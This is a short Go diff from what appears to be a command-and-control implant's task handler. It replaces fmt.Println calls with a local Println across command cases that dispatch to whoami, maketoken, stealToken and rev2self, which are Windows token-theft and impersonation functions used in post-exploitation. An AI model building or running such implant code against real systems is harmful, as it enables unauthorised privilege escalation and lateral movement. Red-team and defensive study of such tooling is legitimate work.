@@ -31,7 +31,7 @@ func TaskHandler(task *Task) (stdout []byte, err error) {
 	case "whoami":
 		stdout, err = whoami()
 		if err != nil {
-			fmt.Println("Error Occured --> ", err.Error())
+			Println("Error Occured --> ", err.Error())
 			task.status = "failed"
 			return []byte(err.Error()), err
 		}
@@ -40,12 +40,12 @@ func TaskHandler(task *Task) (stdout []byte, err error) {
 	case "make":
 		//runtime.LockOSThread()
 		//defer runtime.UnlockOSThread()
-		fmt.Println(task.Args[0])
-		fmt.Println(task.Args[1])
-		fmt.Println(task.Args[2])
+		Println(task.Args[0])
+		Println(task.Args[1])
+		Println(task.Args[2])
 		stdout, err = maketoken(task.Args[0], task.Args[1], task.Args[2])
 		if err != nil {
-			fmt.Println("Error Occured --> ", err.Error())
+			Println("Error Occured --> ", err.Error())
 			task.status = "failed"
 			return []byte(err.Error()), err
 		}
@@ -58,7 +58,7 @@ func TaskHandler(task *Task) (stdout []byte, err error) {
 		}
 		stdout, err = stealToken(uint32(pid))
 		if err != nil {
-			fmt.Println("Error Occured --> ", err.Error())
+			Println("Error Occured --> ", err.Error())
 			task.status = "failed"
 		}
 		task.status = "completed"
@@ -66,7 +66,7 @@ func TaskHandler(task *Task) (stdout []byte, err error) {
 	case "rev2self":
 		stdout, err = rev2self()
 		if err != nil {
-			fmt.Println("Error Occured --> ", err.Error())
+			Println("Error Occured --> ", err.Error())
 			task.status = "failed"
 			return []byte(err.Error()), err
 		}
